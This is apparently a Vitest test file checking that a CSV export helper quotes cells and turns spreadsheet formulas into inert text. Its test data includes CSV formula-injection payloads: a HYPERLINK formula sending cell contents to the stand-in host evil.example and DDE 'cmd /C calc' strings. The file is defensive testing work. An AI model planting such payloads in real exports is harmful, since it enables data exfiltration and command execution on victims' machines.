import { describe, expect, it } from "vitest";

import { csvCell, toCsv } from "./csv";

describe("CSV cells", () => {
  it("quotes every cell and doubles quotes inside it", () => {
    expect(csvCell('Aline "Ally" Uwase')).toBe('"Aline ""Ally"" Uwase"');
    expect(csvCell(null)).toBe('""');
    expect(csvCell(42)).toBe('"42"');
  });

  it.each([
    "=HYPERLINK(\"https://evil.example/?d=\"&A1,\"Click\")",
    "+cmd|' /C calc'!A0",
    "-2+3+cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "\t=1+1",
    "\r=1+1",
    "＝1+1",
  ])("turns a formula into text: %s", (value) => {
    const cell = csvCell(value);
    expect(cell.startsWith(`"'`)).toBe(true);
    expect(cell.slice(2, -1).replace(/""/g, '"')).toBe(value);
  });

  it("leaves ordinary names and passwords alone", () => {
    expect(toCsv([["first_name", "temporary_password"], ["Émilie", "amazi-inka-0042"]])).toBe(
      '"first_name","temporary_password"\r\n"Émilie","amazi-inka-0042"',
    );
  });
});
